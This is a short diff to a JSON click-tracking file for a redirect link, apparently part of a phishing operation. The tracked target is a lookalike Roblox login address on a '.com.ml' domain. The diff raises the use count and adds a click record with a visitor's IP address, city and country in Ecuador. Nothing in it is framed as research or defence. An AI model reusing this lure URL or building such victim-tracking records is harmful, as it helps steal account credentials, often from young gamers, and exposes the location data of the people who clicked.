@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 216,
+    "useCount": 217,
     "createdBy": "admin",
     "clicks": [
       {
@@ -1838,6 +1838,14 @@
         "ip": "186.42.19.199",
         "country": "Ecuador",
         "city": "Ibarra",
+        "flag": "🇪🇨",
+        "countryCode": "EC"
+      },
+      {
+        "timestamp": 1776982733268,
+        "ip": "157.100.199.171",
+        "country": "Ecuador",
+        "city": "Guayaquil",
         "flag": "🇪🇨",
         "countryCode": "EC"
       }
